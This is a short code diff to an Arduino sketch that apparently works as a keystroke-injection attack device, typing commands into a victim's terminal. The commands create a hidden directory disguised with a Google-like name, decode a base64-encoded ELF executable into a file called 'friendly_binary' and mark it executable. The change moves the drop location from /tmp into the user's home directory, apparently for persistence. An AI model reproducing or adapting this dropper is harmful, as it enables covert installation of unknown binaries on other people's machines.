@@ -17,7 +17,7 @@ void loop()
   Keyboard.release(KEY_T);
   delay(2000);
 
-  Keyboard.println("mkdir -p /tmp/.com.google.garbage");
+  Keyboard.println("mkdir -p $HOME/.com.google.garbage");
   delay(100);
 
   /*
@@ -27,9 +27,9 @@ void loop()
     We just have to de-base64 it and copy it into the target machine
   */
 
-  Keyboard.println("echo 'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAAuIwgYr/a39l0JPRbM8mxH4Pr/DFDEQNDEeJ5SmjhsFCb/uElN2sHGtHi5peeYrNPXyRCajc3RLqtvqXQS5l1dMOQlDUmItN6wTqz2DI9Q0VZPSlwFN6cs+uhW4OMjS1x0CWWyy0D2Dsyc1HY85ht3hdS3Z0a65ie3fz5l/9kS6tPlX40Klr4N8q6QDY0PbCCNT2w9Pi9Cg==' | base64 -d | cat > /tmp/.com.google.garbage/friendly_binary");
+  Keyboard.println("echo 'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjqAAAAgAEAAAcAAAAAEAAAuIwgYr/a39l0JPRbM8mxH4Pr/DFDEQNDEeJ5SmjhsFCb/uElN2sHGtHi5peeYrNPXyRCajc3RLqtvqXQS5l1dMOQlDUmItN6wTqz2DI9Q0VZPSlwFN6cs+uhW4OMjS1x0CWWyy0D2Dsyc1HY85ht3hdS3Z0a65ie3fz5l/9kS6tPlX40Klr4N8q6QDY0PbCCNT2w9Pi9Cg==' | base64 -d | cat > $HOME/.com.google.garbage/friendly_binary");
   delay(100);
-  Keyboard.println("chmod +x /tmp/.com.google.garbage/friendly_binary");
+  Keyboard.println("chmod +x $HOME/.com.google.garbage/friendly_binary");
   delay(100);
 
   /*
